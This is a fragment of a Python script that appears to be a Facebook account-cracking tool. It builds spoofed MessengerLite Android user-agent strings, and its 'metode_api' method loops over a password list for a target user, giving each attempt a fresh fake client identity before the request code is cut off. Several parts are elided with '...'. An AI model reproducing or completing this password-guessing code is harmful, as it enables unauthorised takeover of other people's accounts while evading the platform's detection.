...
def usera():
	...
	ua_realme = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {realme} Build/{build}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Realme;FBBD/Realme;FBDV/{realme};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	...
	def metode_api(self,user,pwx):
		...
		for pw in pwx:
			try:
				pw = pw.lower()
				ua = usera()
				#ua = "Mozilla/5.0 (Linux; Android 11; Redmi Note 13 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36;]"
				ses = requests.Session()
